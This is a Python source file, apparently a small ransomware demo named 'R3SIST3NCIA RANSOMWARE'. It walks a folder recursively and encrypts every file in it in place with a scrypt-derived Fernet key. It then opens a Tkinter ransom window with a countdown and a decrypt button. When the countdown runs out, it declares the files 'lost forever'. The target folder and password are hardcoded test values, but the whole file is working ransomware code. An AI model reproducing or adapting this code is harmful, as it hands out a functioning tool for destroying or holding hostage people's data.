import pathlib
import secrets
import os
import base64
import getpass
import time
from pathlib import Path
import tkinter as tk

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


# salt -> bits added to the password before it is hashed
# with the intent to strengthen it
def generate_salt(size=16):
    return secrets.token_bytes(size)


def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2 ** 14, r=8, p=1)
    return kdf.derive(password.encode())


def load_salt():
    return open("salt.salt", "rb").read()


def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)

    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)


def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)


def encrypt_folder(path_to_folder, key):
    for child in pathlib.Path(path_to_folder).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)


def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()

    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return

    with open(filename, "wb") as file:
        file.write(decrypted_data)


def decrypt_folder(path_to_folder, key):
    for child in pathlib.Path(path_to_folder).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)


def countdown(count):
    hour, minute, second = count.split(":")
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
    else:
        root.destroy()
        return

    root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

def encrypt_files():
    encrypt_folder('test', generate_key('1234', salt_size=32, save_salt=True))


def decrypt_files():
    decrypt_folder('test', generate_key('1234', load_existing_salt=True))
    root.destroy()

    good = tk.Tk()
    good.title('Good for you')
    good.geometry('300x50')
    good.resizable(False, False)
    tk.Label(good, text='Your files have been decrypted... yay.', font=('calibri', 12, 'bold')).pack()
    good.after(5000, good.destroy)
    good.mainloop()

    quit()


encrypt_files()

res = """
  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
 | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
 |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
  |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """

root = tk.Tk()
root.title('R3SIST3NCIA RANSOMWARE')
root.geometry('500x300')
root.resizable(False, False)
tk.Label(root, text=res, font=('consolas', 12)).pack()
tk.Label(root, text="Your files have been encrypted :D",  font=('calibri', 12,'bold')).pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='black', bg='red')
label.pack()
w = tk.Button(root, text='Decrypt Files', command=decrypt_files)
w.pack(side='bottom')

countdown('00:00:01')
root.mainloop()


bye = tk.Tk()
bye.title('HAHAHA')
bye.geometry('300x50')
bye.resizable(False, False)
tk.Label(bye, text='Your files are lost forever... :D byeee', font=('calibri', 12,'bold')).pack()
bye.after(5000, bye.destroy)
bye.mainloop()